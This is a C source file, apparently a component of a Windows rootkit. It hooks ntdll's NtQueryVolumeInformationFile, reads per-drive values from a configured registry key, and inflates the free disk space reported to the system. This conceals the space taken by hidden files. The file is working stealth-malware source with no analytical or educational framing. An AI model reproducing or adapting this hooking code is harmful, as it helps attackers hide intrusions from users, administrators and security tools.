#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "misc.h"
#include "config.h"
#include "safe.h"

#include "ntqueryvolumeinformationfile.h"

// get SectorsPerAllocationUnit
ULONG getSectorsPerAllocationUnit(PVOID pBuffer,FS_INFORMATION_CLASS fic)
{
	ULONG ulRet=0;

	switch(fic)
	{
		case FileFsSizeInformation:
			ulRet=((PFILE_FS_SIZE_INFORMATION)pBuffer)->SectorsPerAllocationUnit;
			break;

		case FileFsFullSizeInformation:
			ulRet=((PFILE_FS_FULL_SIZE_INFORMATION)pBuffer)->SectorsPerAllocationUnit;
			break;

		default:
			break;
	}

	return ulRet;
}

// get BytesPerSector
ULONG getBytesPerSector(PVOID pBuffer,FS_INFORMATION_CLASS fic)
{
	ULONG ulRet=0;

	switch(fic)
	{
		case FileFsSizeInformation:
			ulRet=((PFILE_FS_SIZE_INFORMATION)pBuffer)->BytesPerSector;
			break;

		case FileFsFullSizeInformation:
			ulRet=((PFILE_FS_FULL_SIZE_INFORMATION)pBuffer)->BytesPerSector;
			break;

		default:
			break;
	}

	return ulRet;
}

// set AvailableAllocationUnits
void setAvailableAllocationUnits(PVOID pBuffer,FS_INFORMATION_CLASS fic,ULONGLONG ullSet)
{
	switch(fic)
	{
		case FileFsSizeInformation:
			((PFILE_FS_SIZE_INFORMATION)pBuffer)->AvailableAllocationUnits.QuadPart+=ullSet;
			break;

		case FileFsFullSizeInformation:
			((PFILE_FS_FULL_SIZE_INFORMATION)pBuffer)->AvailableAllocationUnits.QuadPart+=ullSet;
			break;

		default:
			break;
	}
}

// set AvailableQuotaAllocationUnits
void setAvailableQuotaAllocationUnits(PVOID pBuffer,FS_INFORMATION_CLASS fic,ULONGLONG ulSet)
{
	switch(fic)
	{
		case FileFsFullSizeInformation:
			((PFILE_FS_FULL_SIZE_INFORMATION)pBuffer)->AvailableQuotaAllocationUnits.QuadPart+=ulSet;
			break;

		default:
			break;
	}
}

// open handle to HIDDEN_HDSPACE_REGKEY
HANDLE OpenHdHidingRegKey(void)
{
	OBJECT_ATTRIBUTES oa;
	HANDLE hRegKey;
	NTSTATUS rc;
	UNICODE_STRING usKey;

	if (!config_GetOneStringW(ConfigHdSpaceRegKey,0,&usKey))
		return NULL;

	InitializeObjectAttributes(&oa,&usKey,OBJ_CASE_INSENSITIVE,NULL,NULL);

	// safely open it :) -> TODO: SafeNtOpenKey
	rc=NtOpenKey(&hRegKey,KEY_QUERY_VALUE,&oa);
	if (!NT_SUCCESS(rc))
		return NULL;
	
	return hRegKey;
}

ULONGLONG GetEnumValue(HANDLE hKey,ULONG ulIndex,PANSI_STRING pasName)
{
	NTSTATUS rc;
	DWORD dwSizeNeeded;
	DWORD dwLen=512;
	LPVOID lpBuffer;
	PKEY_VALUE_FULL_INFORMATION pkvfiValueInfo;
	ULONGLONG ullValue;
	UNICODE_STRING usName;
	
	// create start buffer
	rc=NtAllocateVirtualMemory(NtCurrentProcess(),&lpBuffer,0,&dwLen,MEM_COMMIT|MEM_TOP_DOWN,PAGE_READWRITE);
	if (!NT_SUCCESS(rc))
		return 0;

	// enum value -> TODO: SafeNtEnumerateValueKey
	while (SafeNtEnumerateValueKey(hKey,ulIndex,KeyValueFullInformation,lpBuffer,dwLen,&dwSizeNeeded)==STATUS_BUFFER_TOO_SMALL)
	{
		misc_FreeBuffer(&lpBuffer);
		dwLen+=dwSizeNeeded;
		rc=NtAllocateVirtualMemory(NtCurrentProcess(),&lpBuffer,0,&dwLen,MEM_COMMIT|MEM_TOP_DOWN,PAGE_READWRITE);
		if (!NT_SUCCESS(rc))
			return 0;
	}

	// failed ?
	if (!NT_SUCCESS(rc))
	{
		misc_FreeBuffer(&lpBuffer);
		return 0;
	}

	// get value info
	pkvfiValueInfo=(PKEY_VALUE_FULL_INFORMATION)lpBuffer;
	if (pkvfiValueInfo->Type==REG_SZ)
	{
		// value data
		ullValue=(ULONGLONG)_wtoi64((u_short*)((char*)pkvfiValueInfo+pkvfiValueInfo->DataOffset));

		if (pasName)
		{
			// convert to UNICODE_STRING
			usName.Buffer=pkvfiValueInfo->Name;
			usName.Length=(USHORT)pkvfiValueInfo->NameLength;
			usName.MaximumLength=(USHORT)pkvfiValueInfo->NameLength;

			// and convert to ANSI_STRING
			RtlUnicodeStringToAnsiString(pasName,&usName,TRUE);
		}

		misc_FreeBuffer(&lpBuffer);
		return ullValue;
	}
	
	misc_FreeBuffer(&lpBuffer);
	return 0;
}

// ntdll.NtQueryVolumeInformationFile
NTSTATUS WINAPI NewNtQueryVolumeInformationFile(
  HANDLE               FileHandle,
  PIO_STATUS_BLOCK     IoStatusBlock,
  PVOID                FileSystemInformation,
  ULONG                Length,
  FS_INFORMATION_CLASS FileSystemInformationClass 
)
{
	NTSTATUS rc;

	// call original function
	rc=OldNtQueryVolumeInformationFile(
			FileHandle,
			IoStatusBlock,
			FileSystemInformation,
			Length,
			FileSystemInformationClass
			);

	if (NT_SUCCESS(rc) && 
		(FileSystemInformationClass==FileFsSizeInformation
	   || FileSystemInformationClass==FileFsFullSizeInformation))
	{
		CHAR DRIVE_PATH[]="\\??\\?:\\";
		CHAR lpBuffer[UNICODE_MAX_PATH+UNICODE_NULL];
		HANDLE hFile,hRegKey;
		OBJECT_ATTRIBUTES oa;
		ANSI_STRING asValueName,asDriveOne,asDriveTwo,asObjectName;
		UNICODE_STRING usDrive;
		ULONG ulAllocSectorBytes,ulResultLen;
		UINT uiCount=0;
		ULONGLONG ullValue;
		IO_STATUS_BLOCK isb;
					
		// dont need to hide anything
		if (!(hRegKey=OpenHdHidingRegKey())) return rc;
						
		// zero the buffer
		RtlZeroMemory(&lpBuffer,UNICODE_MAX_PATH+UNICODE_NULL); 
		
		// get filehandle name
		NtQueryObject(FileHandle,ObjectNameInformation,&lpBuffer,UNICODE_MAX_PATH,&ulResultLen);
		if (((POBJECT_NAME_INFORMATION)lpBuffer)->Name.Buffer)
		{
			RtlUnicodeStringToAnsiString(&asObjectName,&((POBJECT_NAME_INFORMATION)lpBuffer)->Name,TRUE);

			while ((ullValue=GetEnumValue(hRegKey,uiCount,&asValueName))!=0)
			{
				strncpy(DRIVE_PATH+4,asValueName.Buffer,1);
				RtlInitAnsiString(&asDriveOne,DRIVE_PATH);
				RtlAnsiStringToUnicodeString(&usDrive,&asDriveOne,TRUE);
				InitializeObjectAttributes(&oa,&usDrive,OBJ_CASE_INSENSITIVE,NULL,NULL);

				if (!NT_SUCCESS(NtCreateFile(&hFile,FILE_LIST_DIRECTORY,&oa,&isb,0,FILE_ATTRIBUTE_NORMAL,FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,FILE_OPEN_IF,FILE_DIRECTORY_FILE,NULL,0)))
				{
					RtlFreeUnicodeString(&usDrive);
					RtlFreeAnsiString(&asValueName);
					RtlFreeAnsiString(&asObjectName);
					return rc;
				}

				RtlZeroMemory(&lpBuffer,UNICODE_MAX_PATH+UNICODE_NULL);

				NtQueryObject(hFile,ObjectNameInformation,&lpBuffer,UNICODE_MAX_PATH,&ulResultLen);
				if (((POBJECT_NAME_INFORMATION)lpBuffer)->Name.Buffer)
				{
					RtlUnicodeStringToAnsiString(&asDriveTwo,&((POBJECT_NAME_INFORMATION)lpBuffer)->Name,TRUE);

					if (_strnicmp(asObjectName.Buffer,asDriveTwo.Buffer,asDriveTwo.Length)==0)
					{
						ulAllocSectorBytes=getSectorsPerAllocationUnit(FileSystemInformation,FileSystemInformationClass)*getBytesPerSector(FileSystemInformation,FileSystemInformationClass);
						setAvailableAllocationUnits(FileSystemInformation,FileSystemInformationClass,ullValue/ulAllocSectorBytes); // change used space
						setAvailableQuotaAllocationUnits(FileSystemInformation,FileSystemInformationClass,ullValue/ulAllocSectorBytes); // change used space
						if (ullValue%ulAllocSectorBytes) // if TRUE, add one (sector * bytes)
						{
							setAvailableAllocationUnits(FileSystemInformation,FileSystemInformationClass,1); // change used space
							setAvailableQuotaAllocationUnits(FileSystemInformation,FileSystemInformationClass,1); // change used space
						}
					}

					RtlFreeAnsiString(&asDriveTwo);
				}

				NtClose(hFile);
				RtlFreeAnsiString(&asValueName);
				RtlFreeUnicodeString(&usDrive);

				uiCount++;
			}

			RtlFreeAnsiString(&asObjectName);
		}
	}

	return rc;
}